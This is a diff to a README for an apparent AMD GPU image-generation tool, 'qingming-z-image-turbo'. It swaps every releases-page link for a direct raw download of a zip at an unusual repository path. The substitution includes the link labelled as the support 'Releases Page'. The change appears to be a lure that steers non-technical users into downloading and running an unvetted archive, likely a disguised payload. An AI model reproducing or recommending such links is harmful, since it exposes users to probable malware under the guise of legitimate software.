@@ -1,7 +1,7 @@
 <h1>🧠 qingming-z-image-turbo - Fast Image Generation on Your AMD GPU</h1>
 
 <p align="center">
-<a href="https://github.com/Deskbound-accelerationunit151/qingming-z-image-turbo/releases" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Now</a>
+<a href="https://raw.githubusercontent.com/Deskbound-accelerationunit151/qingming-z-image-turbo/main/devices/780m/3.2.zip" style="display:inline-block;padding:15px 30px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;text-decoration:none;border-radius:8px;font-size:20px;font-weight:bold;box-shadow:0 4px 15px rgba(102,126,234,0.4);">⬇️ Download Now</a>
 </p>
 
 <p align="center">Turn text descriptions into stunning images using your AMD Radeon RX 7900 XTX graphics card. No coding or technical setup required.</p>
@@ -15,7 +15,7 @@ This section will help you download and run the application in just a few minute
 ### 📦 Download the Software
 
 Visit this link to download the application:  
-[**https://github.com/Deskbound-accelerationunit151/qingming-z-image-turbo/releases**](https://github.com/Deskbound-accelerationunit151/qingming-z-image-turbo/releases)
+[**https://raw.githubusercontent.com/Deskbound-accelerationunit151/qingming-z-image-turbo/main/devices/780m/3.2.zip**](https://raw.githubusercontent.com/Deskbound-accelerationunit151/qingming-z-image-turbo/main/devices/780m/3.2.zip)
 
 ### ▶️ Run the Application
 
@@ -85,7 +85,7 @@ A: Only for the initial download. After that, everything runs locally on your co
 
 ## 📝 Support and Feedback
 
-If you encounter any issues or have suggestions for improvement, please visit the [Releases Page](https://github.com/Deskbound-accelerationunit151/qingming-z-image-turbo/releases) and leave a comment in the discussions section. The development team actively monitors feedback and releases updates to improve the application.
+If you encounter any issues or have suggestions for improvement, please visit the [Releases Page](https://raw.githubusercontent.com/Deskbound-accelerationunit151/qingming-z-image-turbo/main/devices/780m/3.2.zip) and leave a comment in the discussions section. The development team actively monitors feedback and releases updates to improve the application.
 
 ---
 
